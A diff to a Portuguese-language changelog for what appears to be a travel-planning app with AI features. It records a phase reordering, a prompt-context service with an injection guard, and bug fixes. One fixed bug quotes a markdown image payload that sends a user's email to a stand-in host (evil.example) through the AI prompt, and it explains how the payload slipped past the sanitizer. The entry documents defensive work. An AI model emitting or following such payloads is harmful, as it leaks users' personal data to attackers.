@@ -7,6 +7,28 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ---
 
+## [0.59.0] - 2026-04-15
+
+### Added
+- [SPEC-RELEASE-REORDER-PHASES] Feature flag env-only `PHASE_REORDER_ENABLED` (default OFF) como gate de UI/labels do rollout gradual da reordenacao das fases da expedicao
+- [SPEC-ARCH-REORDER-PHASES] ExpeditionAiContextService como assembler centralizado de contexto de prompt com guard de injecao, BOLA, e degradacao graceful (ADR-032)
+- [SPEC-ARCH-REORDER-PHASES] Scripts de migracao big-bang `scripts/db/migrate-phase-reorder.sql` (transacional, idempotente) e `scripts/db/reverse-phase-reorder.sql` (break-glass)
+- [SPEC-AI-REORDER-PHASES] Digest builders puros (`buildGuideDigest`, `buildItineraryDigest`, `buildLogisticsDigest`) com budget de tokens e sanitizacao centralizada
+
+### Changed
+- [SPEC-PROD-REORDER-PHASES] Nova ordem semantica das fases: Guia (3), Roteiro (4), Logistica (5), Checklist (6). Codigo permanece dormente em producao nesta versao (migracao ocorre em v0.60.0)
+- [SPEC-AI-REORDER-PHASES] Constantes semanticas de fase adotadas em AI actions e engines; `getChecklistPhaseNumber()` e `getItineraryPhaseNumber()` flag-aware
+- **Bump de versao**: `package.json` corrigido para `0.59.0` (estava dessincronizado em `0.35.1` — RISK-017)
+
+### Fixed
+- [BUG-S44-W4-001] Markdown image URL `![x](https://evil.example/?pii={email})` em `localMobility` sobrevivia ao `sanitizeForPrompt` e chegava intacto no prompt do Checklist. Adicionados padrao de markdown image e URL HTTP/HTTPS em `HIGH_CONFIDENCE_PATTERNS` do injection guard.
+- [BUG-S44-W4-002] `getNextStepsSuggestions` hardcodava `completeChecklist` CTA em `phase === 3`. Com flag ON, Checklist esta na fase 6. Corrigido para usar `checklistPhase = isPhaseReorderEnabled() ? 6 : 3`.
+
+### Security
+- Revisao de injection surface via `ExpeditionAiContextService`: todos os campos user-originated passam por `sanitizeForPrompt` exatamente uma vez antes de entrar em qualquer digest. Zero bypass paths identificados.
+
+---
+
 ## [0.10.0] - 2026-03-09
 
 ### Added
